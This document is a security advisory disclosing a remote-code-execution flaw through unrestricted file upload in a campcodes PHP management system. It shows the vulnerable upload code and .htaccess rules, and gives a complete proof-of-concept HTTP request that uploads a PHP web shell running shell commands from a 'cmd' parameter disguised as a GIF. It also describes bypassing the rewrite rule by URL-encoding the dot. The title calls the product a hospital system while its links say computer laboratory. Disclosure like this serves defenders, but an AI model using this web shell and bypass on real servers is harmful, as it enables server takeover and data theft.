# Remote Code Execution via Arbitrary File Upload in Hospital Management System

## Vendor Homepage and Product Link:
> https://www.campcodes.com/

> https://www.campcodes.com/projects/php/computer-laboratory-management-system/


## Code
``` php

$imageName = $_FILES['e_photo']['name'];
$extension = pathinfo($imageName, PATHINFO_EXTENSION);
$tmpData = $_FILES['e_photo']['tmp_name'];
$fileName = time();
$fileStatus = move_uploaded_file($tmpData,'../../uploads/'.$fileName.".".$extension);

$file = "";

```

## .htaccess
```
RewriteEngine on

# Rewrite /foo/bar to /foo/bar.php
RewriteRule ^([^.?]+)$ %{REQUEST_URI}.php [L]

# Return 404 if original request is /foo/bar.php
RewriteCond %{THE_REQUEST} "^[^ ]* .*?\.php[? ].*$"
RewriteRule .* - [L,R=404]
```

## Proof of Concept
**HTTP Request Example**
``` http request
POST /LabManagement/class/edit/edit HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------413917020140141070373180478907
Content-Length: 1466
Origin: http://localhost
Connection: keep-alive
Referer: http://localhost/LabManagement/views/items_info?item=18&1Qke
Cookie: csrftoken=hn6Cf393SZVS43NE14nv2rYENzlA2dLXNthZqmVXNw6j1t0dOvrk3n8kgQeKAnBn; PHPSESSID=qja3tm9mg54rs29pso3imkoggi
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------413917020140141070373180478907
Content-Disposition: form-data; name="e_photo"; filename="test.php"
Content-Type: image/jpeg

GIF89a;
<?php
echo system($_GET['cmd']); 
?>

-----------------------------413917020140141070373180478907

Content-Disposition: form-data; name="e_number"

2009991
-----------------------------413917020140141070373180478907
Content-Disposition: form-data; name="e_id"
18
-----------------------------413917020140141070373180478907
Content-Disposition: form-data; name="key"
edititem
-----------------------------413917020140141070373180478907
---snipped---

```

## Screenshot
![image](https://github.com/user-attachments/assets/3a8d19c0-1319-476b-b016-b4e9aab9e337)

The `.htaccess` configuration can be bypassed using URL encoding, as the server's rewrite condition does not decode the URL before processing the rules. Encoding the `.` as `%2E` allows the rewrite condition to be bypassed.

![image](https://github.com/user-attachments/assets/c848ae57-4885-4cbb-b16d-e2ed33a42854)




## **Credits**
> [John Alan Correche](https://github.com/shaturo1337)
